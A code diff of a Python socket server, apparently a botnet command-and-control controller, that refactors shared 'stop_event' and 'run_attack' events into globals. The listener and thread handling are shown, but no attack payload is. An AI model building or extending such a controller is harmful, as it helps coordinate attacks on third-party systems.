@@ -2,10 +2,16 @@ import socket
 import threading
 from threading import Event
 from time import sleep
+
 active_connections_lock = threading.Lock()
 active_connections = 0
 
-def acceptor(s: socket.socket, run_attack: Event, stop_event: Event):
+# event that can be used to tell all threads to stop running
+stop_event = threading.Event() 
+run_attack = threading.Event()
+
+
+def acceptor(s: socket.socket):
     global active_connections
     while not stop_event.is_set():
         try:
@@ -14,7 +20,7 @@ def acceptor(s: socket.socket, run_attack: Event, stop_event: Event):
             with active_connections_lock:
                 active_connections += 1
             print("currently handling", active_connections, "connections")
-            client_thread = threading.Thread(target=handle_client, args=(connection, address, run_attack, stop_event))
+            client_thread = threading.Thread(target=handle_client, args=(connection, address))
             client_thread.start()
         except socket.timeout:  
             # use periodic time outs to check if the user has pressed ctrl+c, 
@@ -23,7 +29,7 @@ def acceptor(s: socket.socket, run_attack: Event, stop_event: Event):
 
 
 # function to handle a client connection if any
-def handle_client(conn: socket.socket, addr, run_attack: Event, stop_event: Event):
+def handle_client(conn: socket.socket, addr):
     global active_connections
     conn.settimeout(1)
     state = None
@@ -56,10 +62,6 @@ def handle_client(conn: socket.socket, addr, run_attack: Event, stop_event: Even
 
 
 if __name__ == "__main__":
-    
-    # event that can be used to tell all threads to stop running
-    stop_event = threading.Event() 
-    run_attack = threading.Event()
 
     # socket creation and initialization
     s = socket.socket()
@@ -73,7 +75,7 @@ if __name__ == "__main__":
     # listen for any incoming connections from clients
     s.listen(5)
     # start a thread that accepts incoming connections from botnets
-    acceptor_thread = threading.Thread(target=acceptor, args=(s, run_attack, stop_event))
+    acceptor_thread = threading.Thread(target=acceptor, args=(s,))
     acceptor_thread.start()
 
     try:
